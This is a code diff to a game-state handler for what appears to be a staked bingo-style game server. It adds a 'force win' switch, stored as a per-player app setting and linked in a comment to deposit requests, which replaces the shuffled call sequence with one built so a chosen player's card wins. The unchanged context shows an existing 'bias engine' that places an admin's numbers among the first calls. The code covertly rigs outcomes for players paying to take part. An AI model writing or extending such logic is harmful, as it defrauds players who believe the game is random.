@@ -7,6 +7,8 @@ const biasEngine = require("../biasEngine");
 
 const prisma = new PrismaClient();
 
+const FORCE_WIN_PLAYER_PREFIX = "force_win.player.";
+
 function parseTid(input) {
   const tidStr = String(input || "").trim();
   if (!tidStr) return { tidStr: "", tidBig: null };
@@ -31,6 +33,44 @@ async function getRoomStopState(stake) {
   const key = `stop_stake_${stake}`;
   const raw = await cache.get(key);
   return raw === 1 || raw === true || String(raw) === "1";
+}
+
+function isTrueSetting(value) {
+  return value === 1 || value === true || value === "1" || value === "true";
+}
+
+async function findForcedWinSelection(selections) {
+  const playerIds = Array.from(
+    new Set(selections.map((sel) => sel.playerId).filter(Boolean)),
+  );
+  if (!playerIds.length) return null;
+
+  const keys = playerIds.map((id) => `${FORCE_WIN_PLAYER_PREFIX}${id}`);
+  const settings = await prisma.appSetting.findMany({
+    where: { key: { in: keys } },
+    select: { key: true, value: true, updatedAt: true },
+  });
+
+  const enabled = settings.filter((row) => isTrueSetting(row.value));
+  if (!enabled.length) return null;
+
+  enabled.sort(
+    (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime(),
+  );
+  const chosen = enabled[0];
+  const chosenId = Number(chosen.key.replace(FORCE_WIN_PLAYER_PREFIX, ""));
+  if (!Number.isFinite(chosenId)) return null;
+
+  const playerSelections = selections.filter(
+    (sel) => sel.playerId === chosenId,
+  );
+  if (!playerSelections.length) return null;
+
+  playerSelections.sort((a, b) => Number(a.slot) - Number(b.slot));
+  return {
+    playerId: chosenId,
+    selection: playerSelections[0],
+  };
 }
 
 async function handleGameState(req, res, io) {
@@ -206,26 +246,73 @@ async function handleGameState(req, res, io) {
             [sequence[i], sequence[j]] = [sequence[j], sequence[i]];
           }
 
+          // One-game forced win from deposit request (if enabled)
+          let forcedApplied = false;
+          try {
+            const forced = await findForcedWinSelection(freshSelections);
+            if (forced) {
+              await prisma.appSetting.deleteMany({
+                where: {
+                  key: `${FORCE_WIN_PLAYER_PREFIX}${forced.playerId}`,
+                },
+              });
+
+              await prisma.selection.updateMany({
+                where: { gameId: game.id, playerId: forced.playerId },
+                data: { autoEnabled: true },
+              });
+
+              const { pattern } = await biasEngine.getCurrentPattern();
+              const card = getCard(forced.selection.index);
+              const requiredNumbers = biasEngine.getRequiredNumbers(
+                card,
+                pattern,
+              );
+
+              const otherCards = [];
+              for (const sel of freshSelections) {
+                if (sel.playerId === forced.playerId) continue;
+                try {
+                  otherCards.push(getCard(sel.index));
+                } catch (_) {}
+              }
+
+              const lastWinCall = await cache.get("bias_last_win_call");
+              const forcedResult = biasEngine.buildBiasedSequence(
+                requiredNumbers,
+                otherCards,
+                lastWinCall,
+              );
+              sequence = forcedResult.sequence;
+              await cache.set("bias_last_win_call", forcedResult.targetCall);
+              forcedApplied = true;
+            }
+          } catch (forcedErr) {
+            console.error("force win init error:", forcedErr);
+          }
+
           // Initialize bias round if toggle is ON
           // Returns a biased sequence where admin's numbers are in first 6-8 calls
           try {
-            const takenIndices = freshSelections.map((s) => s.index);
-            const biasResult = await biasEngine.initBiasRound(
-              game.id,
-              takenIndices,
-              freshSelections,
-            );
-            if (biasResult) {
-              // Use the biased sequence instead of the random one
-              sequence = biasResult.biasedSequence;
+            if (!forcedApplied) {
+              const takenIndices = freshSelections.map((s) => s.index);
+              const biasResult = await biasEngine.initBiasRound(
+                game.id,
+                takenIndices,
+                freshSelections,
+              );
+              if (biasResult) {
+                // Use the biased sequence instead of the random one
+                sequence = biasResult.biasedSequence;
 
-              // Re-fetch selections to include the bias player's selection
-              const updatedSels = await prisma.selection.findMany({
-                where: { gameId: game.id, accepted: true },
-                include: { player: true },
-              });
-              freshSelections.length = 0;
-              freshSelections.push(...updatedSels);
+                // Re-fetch selections to include the bias player's selection
+                const updatedSels = await prisma.selection.findMany({
+                  where: { gameId: game.id, accepted: true },
+                  include: { player: true },
+                });
+                freshSelections.length = 0;
+                freshSelections.push(...updatedSels);
+              }
             }
           } catch (biasErr) {
             console.error("biasEngine init error:", biasErr);
